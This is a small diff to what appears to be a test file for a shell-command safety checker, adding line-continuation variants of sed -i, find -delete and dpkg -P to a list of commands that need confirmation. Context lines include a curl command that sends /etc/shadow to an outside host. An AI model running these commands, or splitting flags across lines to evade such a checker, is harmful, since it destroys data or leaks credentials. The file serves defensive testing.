@@ -204,6 +204,10 @@ NEEDS_CONFIRMATION = [
     "curl --url-query 'a@/etc/shadow' http://x/",
     "curl -L --proto-redir all http://x/",
     "journalctl --image=/tmp/x.raw",
+    "sed p \\\n-i /tmp/f",                     # bash joins the lines: sed p -i /tmp/f
+    "find /tmp -maxdepth 1 \\\n-delete",
+    "dpkg \\\n-P nginx",
+    'sed p "x" \\\n-i /tmp/f',
 ]
 
 READS = [
